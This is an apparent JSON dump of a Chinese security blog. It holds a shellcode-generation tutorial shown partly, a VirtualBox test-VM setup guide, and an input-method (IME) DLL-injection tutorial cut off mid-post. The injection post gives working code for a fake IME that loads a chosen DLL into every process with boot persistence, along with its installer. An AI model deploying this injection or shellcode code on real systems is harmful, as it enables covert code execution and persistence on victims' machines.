(c2 != 0x0) &amp;&amp; dwLen &gt; 0);\n    return v;\n}\n\nLPSTR __STRCAT__(\n    __in LPSTR    strDest,\n    __in LPSTR strSource)\n{\n    LPSTR d = strDest;\n    LPSTR s = strSource;\n    while (*d) d++;\n    do { *d++ = *s++; } while (*s);\n    *d = 0x0;\n    return strDest;\n}\n\nLPVOID __MEMCPY__(\n    __in LPVOID lpDst,\n    __in LPVOID lpSrc,\n    __in DWORD dwCount)\n{\n    LPBYTE s = (LPBYTE)lpSrc;\n    LPBYTE d = (LPBYTE)lpDst;\n    while (dwCount--)\n        * d++ = *s++;\n    return lpDst;\n}\n\nUINT __CalcHash__(\n    __in LPVOID lpStr\n)\n{\n    UINT ApiHash = 0;\n    LPBYTE s = (LPBYTE)lpStr;\n    do\n    {\n        ApiHash = (ApiHash &lt;&lt; 7) + (ApiHash &gt;&gt; 25) + *s;\n    } while (*s++);\n    return ApiHash;\n}\n\nHANDLE GetKernel32Handle() {\n    HANDLE hKernel32 = INVALID_HANDLE_VALUE;\n#ifdef _WIN64\n    PPEB lpPeb = (PPEB)__readgsqword(0x60);\n#else\n    PPEB lpPeb = (PPEB)__readfsdword(0x30);\n#endif\n    PLIST_ENTRY pListHead = &amp;lpPeb-&gt;Ldr-&gt;InMemoryOrderModuleList;\n    PLIST_ENTRY pListEntry = pListHead-&gt;Flink;\n    WCHAR strDllName[MAX_PATH];\n    WCHAR strKernel32[] = { &#39;k&#39;, &#39;e&#39;, &#39;r&#39;, &#39;n&#39;, &#39;e&#39;, &#39;l&#39;, &#39;3&#39;, &#39;2&#39;, &#39;.&#39;, &#39;d&#39;, &#39;l&#39;, &#39;l&#39;, L&#39;\\0&#39; };\n\n    while (pListEntry != pListHead) {\n        PLDR_DATA_TABLE_ENTRY pModEntry = CONTAINING_RECORD(pListEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);\n        if (pModEntry-&gt;FullDllName.Length) {\n            DWORD dwLen = pModEntry-&gt;FullDllName.Length;\n            __MEMCPY__(strDllName, pModEntry-&gt;FullDllName.Buffer, dwLen);\n            strDllName[dwLen / sizeof(WCHAR)] = L&#39;\\0&#39;;\n            if (__STRSTRIW__(strDllName, strKernel32)) {\n                hKernel32 = pModEntry-&gt;DllBase;\n                break;\n            }\n        }\n        pListEntry = pListEntry-&gt;Flink;\n    }\n    return hKernel32;\n}\n\n//void __declspec(naked) END_SHELLCODE(void) {}\n\nvoid END_SHELLCODE(void) {}\n\nint main()\n{\n    shell_code();\n    FILE* output_file;\n#ifdef _WIN64\n    fopen_s(&amp;output_file, &quot;shellcode_x64.bin&quot;, &quot;wb&quot;);\n#else\n    fopen_s(&amp;output_file, &quot;shellcode_x32.bin&quot;, &quot;wb&quot;);\n#endif\n    fwrite(shell_code, (int)END_SHELLCODE - (int)shell_code, 1, output_file);\n    fclose(output_file);\n    return 0;\n}</code></pre>\n<p>稍微修改了一点，使用<strong>x64</strong>位编译就可以生成<strong>64位shellcode</strong>，使用<strong>x32</strong>就能生成32位<strong>shellcode</strong>。</p>\n<p>使用了<strong>hash函数名</strong>的方式去找API，不用开那么大栈空间</p>\n<p>总结一下：</p>\n<p>类似<code>memcpy、strlen、strcat</code>等等常用函数，都自行实现，Shellcode的第一个函数要写在开始处。</p>\n<p>C++ 中字符数组定义格式有下面三种</p>\n<pre><code class=\"c++\">    const char* str1 = &quot;I am Str1!&quot;;\n    char str2[] = &quot;I am Str2!&quot;;\n    char str3[] = { &#39;H&#39;,&#39;e&#39;,&#39;l&#39;,&#39;l&#39;,&#39;o&#39;,&#39;.&#39;,&#39;W&#39;,&#39;o&#39;,&#39;l&#39;,&#39;r&#39;,&#39;d&#39;,&#39;!&#39;,0 };</code></pre>\n<p>前面两种都是将字符串保存在<code>rdata</code>段中，第三种方式是将字符串保存在栈中，最后的0表示’\\0’,如果没有结束标志，可能会操作到栈后面的数据。</p>\n"},{"title":"重装环境","index_img":"https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200323161501652.png","banner_img":"https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200323161501652.png","date":"2019-10-09T16:00:00.000Z","_content":"\n\n## 平台介绍\n\n虚拟平台：Oracle VM VirtualBox \n\n虚拟系统：cn_windows_7_ultimate_with_sp1_x64_dvd\n\n下载工具：迅雷&百度云\n\n## 虚拟平台\n\n这里选用VB的原因是因为之前用VM虚拟机做测试，写测试代码的时候速度非常的慢，很容易卡死，而且软件也有很多没必要的。\n\n之前用了一次VB的虚拟机，感觉挺不错。所以这次就安装选用VB平台的试试。\n\n本次选用VB版本为目前最新的 `6.0.18 r136238 (Qt5.6.2)`\n\n## 虚拟系统\n\n因为工作原因，经常要测试系统的安全，这里使用最广泛的WIN7 64位来学习\n\n这里系统镜像选MSDN的P2P链接下载\n\n本次使用链接为，源比较好，使用迅雷非会员下载就能满速\n\n```\ned2k://|file|cn_windows_7_ultimate_with_sp1_x64_dvd_u_677408.iso|3420557312|B58548681854236C7939003B583A8078|/\n```\n\n## 安装配置\n\n### 虚拟机配置\n\n我的安装配置如下，笔记本8G内存，虚拟机用3G差不多\n\n![image-20200323155932577](https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200323155932577.png)\n\n然后等待系统安装完成，为了主机与虚拟机之间的大文件交流，可以添加一个共项文件夹来互传大文件\n\n### 虚拟机安装后的工作\n\n#### 安装增强工具\n\n点击**选项栏->设备->安装增强功能**，然后打开**我的电脑**，打开**CD驱动器**\n\n![image-20200323160936523](https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200323160936523.png)\n\n\n\n然后点击安装`VBoxWindowsAdditions`进行安装即可\n\n安装完重启虚拟机安装成功\n\n#### 配置共享目录和更新问题\n\n这是为了虚拟机和主机之间传输文件\n\n打开任意文件夹，输入`\\\\vboxsvr`，这个文件夹就是和主机同步通信的文件夹\n\n![image-20200323161501652](https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200323161501652.png)\n\n将他创建一个快捷方式放到桌面，方便日后访问。\n\n如果电脑正常联网，那么这时候会出现卡顿，是因为有windows update在更新，就会有一个netsvcs服务占用高内存，导致卡顿\n\n修改配置如下\n\n控制面板找到windows update 修改为从不更新\n\n![image-20200323163842599](C:\\Users\\Cray\\AppData\\Roaming\\Typora\\typora-user-images\\image-20200323163842599.png)\n\n#### 保存镜像\n\n保存一个干净的镜像，这里创建一个系统快照，以后要恢复可以直接恢复到这个状态\n\n![image-20200323162101844](https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200323162101844.png)\n\n以后有大更新也可以在这个基础上创建新的系统\n\n\n\n### 自定义安装\n\n\n\n这里选择安装软件有\n\nSysinternalsSuite套装\n\nX96Dbg调试器\n\nIDA7.0\n\nOllDbg\n\nGoogle Chrom\n\nv2rayN\n\n \n\n\n\n\n\n\n\n\n\n\n\n","source":"_posts/重装环境.md","raw":"---\ntitle: 重装环境\ntags: [VB]\nindex_img: https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200323161501652.png\nbanner_img: https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200323161501652.png\ndate: 2019-10-10\n---\n\n\n## 平台介绍\n\n虚拟平台：Oracle VM VirtualBox \n\n虚拟系统：cn_windows_7_ultimate_with_sp1_x64_dvd\n\n下载工具：迅雷&百度云\n\n## 虚拟平台\n\n这里选用VB的原因是因为之前用VM虚拟机做测试，写测试代码的时候速度非常的慢，很容易卡死，而且软件也有很多没必要的。\n\n之前用了一次VB的虚拟机，感觉挺不错。所以这次就安装选用VB平台的试试。\n\n本次选用VB版本为目前最新的 `6.0.18 r136238 (Qt5.6.2)`\n\n## 虚拟系统\n\n因为工作原因，经常要测试系统的安全，这里使用最广泛的WIN7 64位来学习\n\n这里系统镜像选MSDN的P2P链接下载\n\n本次使用链接为，源比较好，使用迅雷非会员下载就能满速\n\n```\ned2k://|file|cn_windows_7_ultimate_with_sp1_x64_dvd_u_677408.iso|3420557312|B58548681854236C7939003B583A8078|/\n```\n\n## 安装配置\n\n### 虚拟机配置\n\n我的安装配置如下，笔记本8G内存，虚拟机用3G差不多\n\n![image-20200323155932577](https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200323155932577.png)\n\n然后等待系统安装完成，为了主机与虚拟机之间的大文件交流，可以添加一个共项文件夹来互传大文件\n\n### 虚拟机安装后的工作\n\n#### 安装增强工具\n\n点击**选项栏->设备->安装增强功能**，然后打开**我的电脑**，打开**CD驱动器**\n\n![image-20200323160936523](https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200323160936523.png)\n\n\n\n然后点击安装`VBoxWindowsAdditions`进行安装即可\n\n安装完重启虚拟机安装成功\n\n#### 配置共享目录和更新问题\n\n这是为了虚拟机和主机之间传输文件\n\n打开任意文件夹，输入`\\\\vboxsvr`，这个文件夹就是和主机同步通信的文件夹\n\n![image-20200323161501652](https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200323161501652.png)\n\n将他创建一个快捷方式放到桌面，方便日后访问。\n\n如果电脑正常联网，那么这时候会出现卡顿，是因为有windows update在更新，就会有一个netsvcs服务占用高内存，导致卡顿\n\n修改配置如下\n\n控制面板找到windows update 修改为从不更新\n\n![image-20200323163842599](C:\\Users\\Cray\\AppData\\Roaming\\Typora\\typora-user-images\\image-20200323163842599.png)\n\n#### 保存镜像\n\n保存一个干净的镜像，这里创建一个系统快照，以后要恢复可以直接恢复到这个状态\n\n![image-20200323162101844](https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200323162101844.png)\n\n以后有大更新也可以在这个基础上创建新的系统\n\n\n\n### 自定义安装\n\n\n\n这里选择安装软件有\n\nSysinternalsSuite套装\n\nX96Dbg调试器\n\nIDA7.0\n\nOllDbg\n\nGoogle Chrom\n\nv2rayN\n\n \n\n\n\n\n\n\n\n\n\n\n\n","slug":"重装环境","published":1,"updated":"2020-03-31T10:37:29.306Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckhiiw63c002dccuqof6rv87j","content":"<h2 id=\"平台介绍\"><a href=\"#平台介绍\" class=\"headerlink\" title=\"平台介绍\"></a>平台介绍</h2><p>虚拟平台：Oracle VM VirtualBox </p>\n<p>虚拟系统：cn_windows_7_ultimate_with_sp1_x64_dvd</p>\n<p>下载工具：迅雷&amp;百度云</p>\n<h2 id=\"虚拟平台\"><a href=\"#虚拟平台\" class=\"headerlink\" title=\"虚拟平台\"></a>虚拟平台</h2><p>这里选用VB的原因是因为之前用VM虚拟机做测试，写测试代码的时候速度非常的慢，很容易卡死，而且软件也有很多没必要的。</p>\n<p>之前用了一次VB的虚拟机，感觉挺不错。所以这次就安装选用VB平台的试试。</p>\n<p>本次选用VB版本为目前最新的 <code>6.0.18 r136238 (Qt5.6.2)</code></p>\n<h2 id=\"虚拟系统\"><a href=\"#虚拟系统\" class=\"headerlink\" title=\"虚拟系统\"></a>虚拟系统</h2><p>因为工作原因，经常要测试系统的安全，这里使用最广泛的WIN7 64位来学习</p>\n<p>这里系统镜像选MSDN的P2P链接下载</p>\n<p>本次使用链接为，源比较好，使用迅雷非会员下载就能满速</p>\n<pre><code>ed2k://|file|cn_windows_7_ultimate_with_sp1_x64_dvd_u_677408.iso|3420557312|B58548681854236C7939003B583A8078|/</code></pre><h2 id=\"安装配置\"><a href=\"#安装配置\" class=\"headerlink\" title=\"安装配置\"></a>安装配置</h2><h3 id=\"虚拟机配置\"><a href=\"#虚拟机配置\" class=\"headerlink\" title=\"虚拟机配置\"></a>虚拟机配置</h3><p>我的安装配置如下，笔记本8G内存，虚拟机用3G差不多</p>\n<p><img src=\"https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200323155932577.png\" srcset=\"/cray/img/loading.gif\" alt=\"image-20200323155932577\"></p>\n<p>然后等待系统安装完成，为了主机与虚拟机之间的大文件交流，可以添加一个共项文件夹来互传大文件</p>\n<h3 id=\"虚拟机安装后的工作\"><a href=\"#虚拟机安装后的工作\" class=\"headerlink\" title=\"虚拟机安装后的工作\"></a>虚拟机安装后的工作</h3><h4 id=\"安装增强工具\"><a href=\"#安装增强工具\" class=\"headerlink\" title=\"安装增强工具\"></a>安装增强工具</h4><p>点击<strong>选项栏-&gt;设备-&gt;安装增强功能</strong>，然后打开<strong>我的电脑</strong>，打开<strong>CD驱动器</strong></p>\n<p><img src=\"https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200323160936523.png\" srcset=\"/cray/img/loading.gif\" alt=\"image-20200323160936523\"></p>\n<p>然后点击安装<code>VBoxWindowsAdditions</code>进行安装即可</p>\n<p>安装完重启虚拟机安装成功</p>\n<h4 id=\"配置共享目录和更新问题\"><a href=\"#配置共享目录和更新问题\" class=\"headerlink\" title=\"配置共享目录和更新问题\"></a>配置共享目录和更新问题</h4><p>这是为了虚拟机和主机之间传输文件</p>\n<p>打开任意文件夹，输入<code>\\\\vboxsvr</code>，这个文件夹就是和主机同步通信的文件夹</p>\n<p><img src=\"https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200323161501652.png\" srcset=\"/cray/img/loading.gif\" alt=\"image-20200323161501652\"></p>\n<p>将他创建一个快捷方式放到桌面，方便日后访问。</p>\n<p>如果电脑正常联网，那么这时候会出现卡顿，是因为有windows update在更新，就会有一个netsvcs服务占用高内存，导致卡顿</p>\n<p>修改配置如下</p>\n<p>控制面板找到windows update 修改为从不更新</p>\n<p><img src=\"C:%5CUsers%5CCray%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200323163842599.png\" srcset=\"/cray/img/loading.gif\" alt=\"image-20200323163842599\"></p>\n<h4 id=\"保存镜像\"><a href=\"#保存镜像\" class=\"headerlink\" title=\"保存镜像\"></a>保存镜像</h4><p>保存一个干净的镜像，这里创建一个系统快照，以后要恢复可以直接恢复到这个状态</p>\n<p><img src=\"https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200323162101844.png\" srcset=\"/cray/img/loading.gif\" alt=\"image-20200323162101844\"></p>\n<p>以后有大更新也可以在这个基础上创建新的系统</p>\n<h3 id=\"自定义安装\"><a href=\"#自定义安装\" class=\"headerlink\" title=\"自定义安装\"></a>自定义安装</h3><p>这里选择安装软件有</p>\n<p>SysinternalsSuite套装</p>\n<p>X96Dbg调试器</p>\n<p>IDA7.0</p>\n<p>OllDbg</p>\n<p>Google Chrom</p>\n<p>v2rayN</p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"平台介绍\"><a href=\"#平台介绍\" class=\"headerlink\" title=\"平台介绍\"></a>平台介绍</h2><p>虚拟平台：Oracle VM VirtualBox </p>\n<p>虚拟系统：cn_windows_7_ultimate_with_sp1_x64_dvd</p>\n<p>下载工具：迅雷&amp;百度云</p>\n<h2 id=\"虚拟平台\"><a href=\"#虚拟平台\" class=\"headerlink\" title=\"虚拟平台\"></a>虚拟平台</h2><p>这里选用VB的原因是因为之前用VM虚拟机做测试，写测试代码的时候速度非常的慢，很容易卡死，而且软件也有很多没必要的。</p>\n<p>之前用了一次VB的虚拟机，感觉挺不错。所以这次就安装选用VB平台的试试。</p>\n<p>本次选用VB版本为目前最新的 <code>6.0.18 r136238 (Qt5.6.2)</code></p>\n<h2 id=\"虚拟系统\"><a href=\"#虚拟系统\" class=\"headerlink\" title=\"虚拟系统\"></a>虚拟系统</h2><p>因为工作原因，经常要测试系统的安全，这里使用最广泛的WIN7 64位来学习</p>\n<p>这里系统镜像选MSDN的P2P链接下载</p>\n<p>本次使用链接为，源比较好，使用迅雷非会员下载就能满速</p>\n<pre><code>ed2k://|file|cn_windows_7_ultimate_with_sp1_x64_dvd_u_677408.iso|3420557312|B58548681854236C7939003B583A8078|/</code></pre><h2 id=\"安装配置\"><a href=\"#安装配置\" class=\"headerlink\" title=\"安装配置\"></a>安装配置</h2><h3 id=\"虚拟机配置\"><a href=\"#虚拟机配置\" class=\"headerlink\" title=\"虚拟机配置\"></a>虚拟机配置</h3><p>我的安装配置如下，笔记本8G内存，虚拟机用3G差不多</p>\n<p><img src=\"https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200323155932577.png\" srcset=\"/cray/img/loading.gif\" alt=\"image-20200323155932577\"></p>\n<p>然后等待系统安装完成，为了主机与虚拟机之间的大文件交流，可以添加一个共项文件夹来互传大文件</p>\n<h3 id=\"虚拟机安装后的工作\"><a href=\"#虚拟机安装后的工作\" class=\"headerlink\" title=\"虚拟机安装后的工作\"></a>虚拟机安装后的工作</h3><h4 id=\"安装增强工具\"><a href=\"#安装增强工具\" class=\"headerlink\" title=\"安装增强工具\"></a>安装增强工具</h4><p>点击<strong>选项栏-&gt;设备-&gt;安装增强功能</strong>，然后打开<strong>我的电脑</strong>，打开<strong>CD驱动器</strong></p>\n<p><img src=\"https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200323160936523.png\" srcset=\"/cray/img/loading.gif\" alt=\"image-20200323160936523\"></p>\n<p>然后点击安装<code>VBoxWindowsAdditions</code>进行安装即可</p>\n<p>安装完重启虚拟机安装成功</p>\n<h4 id=\"配置共享目录和更新问题\"><a href=\"#配置共享目录和更新问题\" class=\"headerlink\" title=\"配置共享目录和更新问题\"></a>配置共享目录和更新问题</h4><p>这是为了虚拟机和主机之间传输文件</p>\n<p>打开任意文件夹，输入<code>\\\\vboxsvr</code>，这个文件夹就是和主机同步通信的文件夹</p>\n<p><img src=\"https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200323161501652.png\" srcset=\"/cray/img/loading.gif\" alt=\"image-20200323161501652\"></p>\n<p>将他创建一个快捷方式放到桌面，方便日后访问。</p>\n<p>如果电脑正常联网，那么这时候会出现卡顿，是因为有windows update在更新，就会有一个netsvcs服务占用高内存，导致卡顿</p>\n<p>修改配置如下</p>\n<p>控制面板找到windows update 修改为从不更新</p>\n<p><img src=\"C:%5CUsers%5CCray%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200323163842599.png\" srcset=\"/cray/img/loading.gif\" alt=\"image-20200323163842599\"></p>\n<h4 id=\"保存镜像\"><a href=\"#保存镜像\" class=\"headerlink\" title=\"保存镜像\"></a>保存镜像</h4><p>保存一个干净的镜像，这里创建一个系统快照，以后要恢复可以直接恢复到这个状态</p>\n<p><img src=\"https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200323162101844.png\" srcset=\"/cray/img/loading.gif\" alt=\"image-20200323162101844\"></p>\n<p>以后有大更新也可以在这个基础上创建新的系统</p>\n<h3 id=\"自定义安装\"><a href=\"#自定义安装\" class=\"headerlink\" title=\"自定义安装\"></a>自定义安装</h3><p>这里选择安装软件有</p>\n<p>SysinternalsSuite套装</p>\n<p>X96Dbg调试器</p>\n<p>IDA7.0</p>\n<p>OllDbg</p>\n<p>Google Chrom</p>\n<p>v2rayN</p>\n"},{"title":"输入法注入","index_img":"https://cdn.jsdelivr.net/gh/L0yy/tuchuang/Img/20191217102119.png","banner_img":"https://cdn.jsdelivr.net/gh/L0yy/tuchuang/Img/20191217102119.png","date":"2019-08-26T11:11:22.000Z","_content":"\n\n## 特性\n因为输入法的本身特性，能注入任何一个程序，还可以开机启动，很是友好\n\n网上大都是一个版本方法，我记录下我自己过程\n\n## 思路\n1.编写一个正常的输入法\n2.将它安装到电脑上，并设置为默认输入法，这样就可以在程序打开的时候就调用它的处理函数\n\n因为输入是一个特殊的dll，本质就是一个dll，只是后最不同而已。\n\n一个最简ime文件都必须两个函数\n\n\n一个`dllmain()` 还有一个`ImeInquire()`这两个是必须的\n\n### 编写输入法主要文件\n创建一个dll项目,解释都在注释中（注意项目为多字节字符集）\n`dllmain.cpp`\n```C\n#include \"stdafx.h\"\n#include \"windows.h\"\n#include \"imm.h\"\n#include \"immdev.h\"\n#pragma comment(lib,\"imm32.lib\")\n\nLPCSTR injectDllPaht = \"C://expDll.dll\"; //我们最终利用的Dll，写入自己的功能\nvoid injectDLL();//定义函数，下面用\nLRESULT WINAPI UIWndProc(HWND hUIWnd, \n\t\t\t\t\t\tUINT message,\n\t\t\t\t\t\tWPARAM wParam, \n\t\t\t\t\t\tLPARAM lParam) \n{ return 0; }//窗口消息处理函数，可以不要\n\nBOOL APIENTRY DllMain(HMODULE hModule,\n\tDWORD  ul_reason_for_call,\n\tLPVOID lpReserved\n\t)//主函数的标准格式\n{\n\tHINSTANCE hinstDLL = (HINSTANCE)hModule;//下面需要用这个句柄，格式强转以下\n\tswitch (ul_reason_for_call)\n\t{\n\n\tcase DLL_PROCESS_ATTACH:\n\t{\t\t//定义一个窗口类\n\t\t   WNDCLASSEX wc;\n\t\t   wc.cbSize = sizeof(WNDCLASSEX);\n\t\t   wc.style = CS_VREDRAW | CS_HREDRAW | CS_DBLCLKS | CS_IME;\n\t\t   wc.lpfnWndProc = UIWndProc;\n\t\t   wc.cbClsExtra = 0;\n\t\t   wc.cbWndExtra = 2 * sizeof(LONG);\n\t\t   wc.hInstance = hinstDLL;\n\t\t   wc.hCursor = LoadCursor(NULL, IDC_ARROW); //IDC_ARROW\n\t\t   wc.hIcon = NULL;\n\t\t   wc.lpszMenuName = (LPTSTR)NULL;\n\t\t   wc.lpszClassName = TEXT(\"CInjWindow\");//定义的窗口类的名字\n\t\t   wc.hbrBackground = NULL;\n\t\t   wc.hIconSm = NULL;\n\t\t   if (!RegisterClassEx((LPWNDCLASSEX)&wc))//注册这个窗口，IME必须要注册一个窗口才能安装\n\t\t   {\n\t\t\t   break;\n\t\t   }\n\t\t   injectDLL();//干事的func\n\t\t   break;\n\t}\n\tcase DLL_THREAD_ATTACH:\n\t\tbreak;\n\tcase DLL_THREAD_DETACH:\n\t\tbreak;\n\tcase DLL_PROCESS_DETACH:\n\t\tUnregisterClass(\"CInjWindow\", hinstDLL);//程序退出时注销窗口实例\n\t\tbreak;\n\t}\n\treturn TRUE;\n}\n\nvoid injectDLL()\n{\n\tWCHAR Mes[MAX_PATH];\n\t//这里就可以写注入func，我这里就调用一个自己写的测试dll，每次加载的时候都会打印父窗口名称\n\tHMODULE hMyDll = LoadLibrary(injectDllPaht);//因为现在已经在别的进程中，所以导入后的就成功注入想要的进程了\n\tif (!hMyDll)\n\t{\n\t\tDWORD ERRCODE = GetLastError();\n\t\tMessageBox(0, (LPCSTR)ERRCODE, 0, 0);\n\t}\n\telse\n\t{\n\t\tHMODULE hParentM = GetModuleHandle(0);\n\t\t//FARPROC fRunFunc = GetProcAddress(hMyDll, \"Run\");\n\t\t//fRunFunc();\n\t}\n\n}\n\n\nBOOL WINAPI ImeInquire(LPIMEINFO lpImeInfo, LPTSTR lpszUIClass, LPCTSTR lpszOption)\n{\n\t//初始化ImeInquire\n\t//这个函数是除了DllMain后第一个会被win32 调用的函数. 通过调用这个函数知道你的输入法有什么特性.\n\tlpImeInfo->dwPrivateDataSize = 0;\n\tlpImeInfo->fdwProperty = IME_PROP_KBD_CHAR_FIRST | IME_PROP_UNICODE | IME_PROP_IGNORE_UPKEYS | IME_PROP_SPECIAL_UI;\n\tlpImeInfo->fdwConversionCaps = IME_CMODE_NATIVE | IME_CMODE_NOCONVERSION;\n\tlpImeInfo->fdwSentenceCaps = 0;\n\tlpImeInfo->fdwUICaps = UI_CAP_ROT90;\n\tlpImeInfo->fdwSCSCaps = SCS_CAP_COMPSTR | SCS_CAP_MAKEREAD;\n\tlpImeInfo->fdwSelectCaps = (DWORD)0;\n\tlstrcpy(lpszUIClass, \"CInjWindow\");//注意这里，对ImeInquire赋予我们刚刚创建的类\n\treturn TRUE;\n}\n```\n\n因为输入法需要图标，所以需要添加资源文件，右键dll项目添加\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190826175254835.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2N5eUFyYXk=,size_16,color_FFFFFF,t_70)\n添加位图\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190826175356971.png)\n要修改version值如下\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190826174911782.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2N5eUFyYXk=,size_16,color_FFFFFF,t_70)\n\n然后生成就好了\n\n### 真正需要注入的dll\n其实干正事的过程也可以直接放到ime中，但是步方便管理，我这里写出来了\n也是一个dll项目\n\n因为我只是测试，所以就写的很简单，一个验证父进程函数名的就可以了。（游戏辅助代码就可以写在这）\n**dllmain.cpp**如下\n\n```c\n\tcase DLL_PROCESS_ATTACH:\n\t\t//获取当前程序名\n\t\tGetModuleFileName(GetModuleHandle(0),lpFileName,sizeof(lpFileName));\n\t\t//打印出来\n\t\tMessageBox(0,lpFileName, 0, 0);\n}\n\n```\n\n\n\n### 加载ime\n把上面生成的**dll**改名为**ime**结尾，复制到**windows32**目录下\n\n接下来创建一个控制台项目\n\n如下\n```c\n#include \"stdafx.h\"\n#include \"windows.h\"\n#include \"imm.h\"\n#pragma comment(lib,\"imm32.lib\")\n\n\nint _tmain(int argc, _TCHAR* argv[])\n{\n\tif (argc<3)\n\t{\n\t\tMessageBox(0, \"请注意参数 exp：exeName.exe imeName.ime Jerry\", 0, 0);\n\t\treturn 0;\n\t}\n\tLPCSTR infecPath = argv[1];\n\tLPCSTR infecName = argv[2];\n\tPVOID m_retV;\n\t//得到默认的输入法句柄并保存\n\t::SystemParametersInfo(\n\t\tSPI_GETDEFAULTINPUTLANG,\n\t\t0,\n\t\t&m_retV,\n\t\t0);\n\t//安装输入法\n\tHKL m_hImeFile = ImmInstallIME(\n\t\tinfecPath,\n\t\tinfecName);\n\n\tif (ImmIsIME(m_hImeFile))\n\t{\n\t\t//设置为默认输入法\n\t\tSystemParametersInfo(\n\t\t\tSPI_SETDEFAULTINPUTLANG,\n\t\t\t0,\n\t\t\t&m_hImeFile,\n\t\t\tSPIF_SENDWININICHANGE);\n\t\tMessageBox(0, \"安装输入法成功\", 0, 0);\n\t}\n\telse\n\t{\n\t\tMessageBox(0, \"error 安装出错了\", 0, 0);\n\t}\n}\n```\n\n把编译生成的exe文件也拷贝到**windows32**下\n\n安装命令如下    `exeName.exe imeName.ime Jerry`\n\n安装程序可以自由发挥，只要把ime文件安装到系统上就是了\n\n### 最终效果\n当你安装成功后，就会有弹窗提示，你打开任意一个程序，都会有弹窗提示这个程序的路径。这就说明已经注入成功了。\n\n开机后在切换输入法时也会启动\n\n\n","source":"_posts/输入法注入.md","raw":"---\ntitle: 输入法注入\nindex_img: https://cdn.jsdelivr.net/gh/L0yy/tuchuang/Img/20191217102119.png\nbanner_img: https://cdn.jsdelivr.net/gh/L0yy/tuchuang/Img/20191217102119.png\ndate: 2019-08-26 19:11:22\ntags:\n    - 注入\n    - 开机启动\ncategories: 逆向\n---\n\n\n## 特性\n因为输入法的本身特性，能注入任何一个程序，还可以开机启动，很是友好\n\n网上大都是一个版本方法，我记录下我自己过程\n\n## 思路\n1.编写一个正常的输入法\n2.将它安装到电脑上，并设置为默认输入法，这样就可以在程序打开的时候就调用它的处理函数\n\n因为输入是一个特殊的dll，本质就是一个dll，只是后最不同而已。\n\n一个最简ime文件都必须两个函数\n\n\n一个`dllmain()` 还有一个`ImeInquire()`这两个是必须的\n\n### 编写输入法主要文件\n创建一个dll项目,解释都在注释中（注意项目为多字节字符集）\n`dllmain.cpp`\n```C\n#include \"stdafx.h\"\n#include \"windows.h\"\n#include \"imm.h\"\n#include \"immdev.h\"\n#pragma comment(lib,\"imm32.lib\")\n\nLPCSTR injectDllPaht = \"C://expDll.dll\"; //我们最终利用的Dll，写入自己的功能\nvoid injectDLL();//定义函数，下面用\nLRESULT WINAPI UIWndProc(HWND hUIWnd, \n\t\t\t\t\t\tUINT message,\n\t\t\t\t\t\tWPARAM wParam, \n\t\t\t\t\t\tLPARAM lParam) \n{ return 0; }//窗口消息处理函数，可以不要\n\nBOOL APIENTRY DllMain(HMODULE hModule,\n\tDWORD  ul_reason_for_call,\n\tLPVOID lpReserved\n\t)//主函数的标准格式\n{\n\tHINSTANCE hinstDLL = (HINSTANCE)hModule;//下面需要用这个句柄，格式强转以下\n\tswitch (ul_reason_for_call)\n\t{\n\n\tcase DLL_PROCESS_ATTACH:\n\t{\t\t//定义一个窗口类\n\t\t   WNDCLASSEX wc;\n\t\t   wc.cbSize = sizeof(WNDCLASSEX);\n\t\t   wc.style = CS_VREDRAW | CS_HREDRAW | CS_DBLCLKS | CS_IME;\n\t\t   wc.lpfnWndProc = UIWndProc;\n\t\t   wc.cbClsExtra = 0;\n\t\t   wc.cbWndExtra = 2 * sizeof(LONG);\n\t\t   wc.hInstance = hinstDLL;\n\t\t   wc.hCursor = LoadCursor(NULL, IDC_ARROW); //IDC_ARROW\n\t\t   wc.hIcon = NULL;\n\t\t   wc.lpszMenuName = (LPTSTR)NULL;\n\t\t   wc.lpszClassName = TEXT(\"CInjWindow\");//定义的窗口类的名字\n\t\t   wc.hbrBackground = NULL;\n\t\t   wc.hIconSm = NULL;\n\t\t   if (!RegisterClassEx((LPWNDCLASSEX)&wc))//注册这个窗口，IME必须要注册一个窗口才能安装\n\t\t   {\n\t\t\t   break;\n\t\t   }\n\t\t   injectDLL();//干事的func\n\t\t   break;\n\t}\n\tcase DLL_THREAD_ATTACH:\n\t\tbreak;\n\tcase DLL_THREAD_DETACH:\n\t\tbreak;\n\tcase DLL_PROCESS_DETACH:\n\t\tUnregisterClass(\"CInjWindow\", hinstDLL);//程序退出时注销窗口实例\n\t\tbreak;\n\t}\n\treturn TRUE;\n}\n\nvoid injectDLL()\n{\n\tWCHAR Mes[MAX_PATH];\n\t//这里就可以写注入func，我这里就调用一个自己写的测试dll，每次加载的时候都会打印父窗口名称\n\tHMODULE hMyDll = 